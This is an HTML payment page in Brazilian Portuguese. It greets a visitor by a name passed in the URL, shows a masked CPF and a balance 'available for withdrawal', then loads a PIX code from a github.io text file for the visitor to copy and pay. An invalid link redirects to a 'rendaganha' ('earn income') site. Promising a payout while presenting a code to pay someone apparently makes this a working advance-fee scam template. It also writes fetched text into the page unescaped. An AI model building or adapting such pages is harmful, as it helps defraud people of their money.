<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagar</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #f8f8f8;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .info {
            margin-bottom: 20px;
        }

        .info p {
            font-size: 18px;
            margin: 10px 0;
        }

        .pix-placeholder {
            margin-top: 20px;
            padding: 20px;
            background-color: #f1f1f1;
            border-radius: 10px;
            font-size: 16px;
            color: #555;
        }

        .copy-button {
            margin-top: 10px;
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .copy-button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Nome do usuário -->
        <h1 id="user-name"></h1>

        <!-- Informações do pagamento -->
        <div class="info">
            <p>Valor disponível para retirada: <span id="valor-disponivel"></span></p>
            <p>CPF do titular: <span id="cpf-titular"></span></p>
        </div>

        <!-- Espaço reservado para o código PIX -->
        <div class="pix-placeholder" id="pix-placeholder">
            Aguarde, carregando código PIX...
        </div>

        <!-- Botão para copiar o código PIX -->
        <button class="copy-button" id="copy-button" style="display: none;">Copiar Código PIX</button>
    </div>

    <script>
        // Função para extrair parâmetros da URL
        function getParameterByName(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        // Função para formatar o CPF (borrando os 6 dígitos do meio)
        function formatarCPF(cpf) {
            if (!cpf || cpf.length !== 11) return cpf; // Retorna o CPF original se não for válido
            return `${cpf.slice(0, 3)}.***.***-${cpf.slice(-2)}`;
        }

        // Recuperando os dados da URL
        const nome = getParameterByName('nome');
        const cpf = getParameterByName('cpf');
        const saldo = getParameterByName('saldo');

        // Exibindo os dados na página
        if (nome && cpf && saldo) {
            document.getElementById('user-name').textContent = `Olá, ${nome}`;
            document.getElementById('valor-disponivel').textContent = `R$${parseFloat(saldo).toFixed(2).replace('.', ',')}`;
            document.getElementById('cpf-titular').textContent = formatarCPF(cpf);
        } else {
            alert("Dados inválidos. Por favor, retorne à página anterior.");
            window.location.href = "https://sites.google.com/view/rendaganha/home"; // Redireciona para o site
        }

        // Função para carregar o código PIX do arquivo pix.txt
        async function carregarCodigoPIX() {
            try {
                // URL do arquivo pix.txt (substitua pelo link do seu Gist ou arquivo hospedado)
                const urlPixTxt = 'https://fabiodkk.github.io/gerarpix/pix.txt';

                // Faz a requisição para carregar o conteúdo do arquivo
                const response = await fetch(urlPixTxt);
                if (!response.ok) {
                    throw new Error('Erro ao carregar o código PIX');
                }

                // Lê o conteúdo do arquivo
                const codigoPIX = await response.text();

                // Exibe o código PIX na página
                document.getElementById('pix-placeholder').innerHTML = `
                    <p>Código PIX: ${codigoPIX}</p>
                `;

                // Mostra o botão de copiar
                document.getElementById('copy-button').style.display = 'block';

                // Configura o botão de copiar
                document.getElementById('copy-button').addEventListener('click', () => {
                    navigator.clipboard.writeText(codigoPIX)
                        .then(() => {
                            alert('Código PIX copiado com sucesso!');
                        })
                        .catch(() => {
                            alert('Erro ao copiar o código PIX.');
                        });
                });
            } catch (error) {
                console.error('Erro ao carregar código PIX:', error);
                document.getElementById('pix-placeholder').textContent = 'Erro ao carregar código PIX.';
            }
        }

        // Carrega o código PIX ao carregar a página
        carregarCodigoPIX();
    </script>
</body>
</html>
